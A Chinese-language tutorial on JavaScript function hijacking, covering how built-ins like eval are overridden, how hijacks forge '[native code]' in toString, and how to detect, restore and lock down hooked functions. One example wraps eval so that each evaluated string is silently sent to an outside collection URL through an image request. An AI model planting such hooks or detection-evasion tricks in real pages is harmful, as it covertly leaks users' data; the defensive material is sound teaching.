# 函数防劫hijacking<sup>shine</sup>
## 1.的函数劫持是什么？
javascript函数劫持，顾名思义，即在一个函数运行之前把它劫持下来，添加我们想要的功能。当这个函数实际运行的时候，它已经不是原本的函数了，而是带上了被我们添加上去的功能。这也是我们常见的钩子函数的原理之一。

```javascript
    var _alert = alert;
    function alert(str){
        if (confirm('How are you?')){
            _alert(str);
        }
    }
    alert('something');
```
类似的还有eval等等函数，甚至算定义函数也可能重写而劫持，因为js本身没有重载功能。

## 2.函数劫持的目的
劫持当然就是希望在执行该函数时，添加一些副作用。比如收集信息（或者说盗取信息）,插入广告等。

```javascript
    var _eval = eval;
    window.eval = function(str){
        setTimeout(function(){
            var img = new Image();
            img.src = "http://www.scscms.com/collect?eval=" + encodeURIComponent(str);
        },0);
        _eval(str);
    };
    eval('var a = "something";');
```
## 3.鉴定内置函数被劫持
怎么鉴定内置函数被劫持，网上流行一种直接方法是把内置函数的toString方法，在返回字符串中判断是否存在\[native code\]字符。比如eval函数没被劫持前返回字符是：
```javascript
function eval() {
    [native code]
}
```
所以他们认为`eval.toString().indexOf("[native code]") > 0`就是劫持了，这未免也太草率了。原因是在劫持过程中可随时添加此字符蒙骗过关：
```javascript
    window.eval = function(str){
        /*[native code]*/
        //[native code]
        console.log("[native code]");
    };
    console.log(eval.toString());
```
看看，是吧。按理说应该返回上面那样干干净净的代码才能判断没有被劫持，不是吗？还真不是！因为假如我添加如下代码呢：
```javascript
    window.eval = function(str){
        //劫持过程省略
    };
    window.eval.toString = function(){
        return `function eval() {
            [native code]
        }`
    };
    console.log(eval.toString());
```
那我还能说点啥呢？
所以检测其是否劫持还得判断其toString方法是否被改写，或者在原型链上的方法是否已改写。
```javascript
    function hijacked(fun){
        //判断是否是干净的内置函数
        return "prototype" in fun || fun.toString().replace(/\n|\s/g, "") != "function"+fun.name+"(){[nativecode]}";
    }
    if(hijacked(eval)){
        console.log("被劫持了");
    }else{
        console.log("没被劫持");
    }
```
## 4.内置函数反劫持

- 1.判断劫持后恢复
一旦判断被劫持后，我们就要想法恢复此方法。
假如劫持人有另存方法为某个变量就简单点，直接还原。但这也是非常不靠谱的。
假如劫持人有使用call调用原始方法，我们也是可以直接找回它的。
```javascript
    var _eval = window.eval;
    window.eval = function(str){
        console.log(str);
        _eval.call(null,str);
    };
    //开始借用call恢复
    Function.prototype.call = function(fun){
        if(this.name == "eval"){
            window.eval = this;//恢复方法
        }
    };
    console.log(eval("var a = 1;"));//恢复前执行
    console.log(eval("var b = 1;"));//恢复后执行
```
此方法缺点也大，一是别人调用方法不一定使用call或apply，二是或许劫持者会事先禁用重写call、apply方法。
```javascript
    Object.defineProperty(Function.prototype, "call", {
        value: Function.prototype.call,writable: false,configurable: false,enumerable: true
    });
    Object.defineProperty(Function.prototype, "apply", {
        value: Function.prototype.apply,writable: false,configurable: false,enumerable: true
    });
```
最绿色环保的当然就是新建一个iframe干净环境来还原内置函数。

```javascript
    var _eval = window.eval;
    window.eval = function(str){
        console.log(str);
        _eval.call(null,str);
    };

    function saveHook(name) {
        var f = document.createElement("iframe");
        f.style.display = "none";
        document.body.appendChild(f);
        window[name]=f.contentWindow[name];
    }
    console.log(eval.toString());
    saveHook("eval");//恢复方法
    console.info(eval.toString());
```
- 2.预先打预防针

其实我觉得最好的反劫持应该是防劫持，即给相应的方法打预防针。主要是通过修改原型配置，禁止重写方法对象。
```javascript
    Object.defineProperty(window, 'eval', {
        writable: false,configurable: false,enumerable: true
    });
    var _eval = window.eval;
    window.eval = function(str){
        console.log(str);
        _eval.call(null,str);
    };
    console.log(eval.toString());
```
如上，此时eval重写将默默失败（严格模式下会报错）。但有个前提就是你的脚本要保证在劫持者之前执行。

### 5.函数绑架

“函数绑架”我们暂且这样称呼它吧。意思是在不破坏原函数结构的基础上，附加绑上一个新方法函数，此函数的触发可定义在原函数调用之前或者之后再触发。这对我们跟踪函数调用非常有用。
```javascript
    Function.prototype.kidnap = function(fun){
        var _this = this;
        return function(){
            fun.apply(_this,arguments);
            return _this.apply(_this,arguments);
        }
    };
    function fun(str){
        console.log(str);
    }
    fun = fun.kidnap(function(str){
        console.info("初次绑架:"+ str);
    });

    fun = fun.kidnap(function(str){
        console.info("再次绑架:"+ str);
    });

    fun("This is a secret");
```
此类绑架因为是绑定在自定义函数里，所以判断是否有绑定有一定难度。不过你还是可以事先把函数保护起来的。
```javascript
    Object.defineProperty(window, 'fun', {
        writable: false,configurable: false,enumerable: true
    });
    //后继的绑架将失败
```